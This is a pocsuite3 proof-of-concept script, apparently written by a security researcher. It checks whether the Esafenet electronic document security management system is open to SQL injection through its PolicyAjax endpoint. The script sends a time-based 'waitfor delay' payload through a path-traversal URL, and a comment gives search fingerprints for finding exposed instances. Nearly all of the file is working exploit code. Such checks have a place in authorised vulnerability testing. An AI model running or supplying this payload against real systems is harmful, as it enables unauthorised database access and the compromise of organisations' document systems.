# _*_ coding:utf-8 _*_
# @Time : 2024/1/31
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class yisaitong_policyajax_sql(POCBase):
    pocDesc = '''亿赛通电子文档安全管理系统-policyajaxSQL注入'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-31'
    name = '亿赛通电子文档安全管理系统-policyajaxSQL注入漏洞'
    #body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"


    def _verify(self):

        result = {}
        url = self.url+ '/CDGServer3/dojojs/../PolicyAjax'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1'
        }
        try:

            data = "command=selectOption&id=-999';waitfor delay '0:0:5'--+&type=JMCL"
            response = requests.post(url, headers=headers,data=data)
            if response.status_code == 200 and response.elapsed.total_seconds() >= 5:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(yisaitong_policyajax_sql)
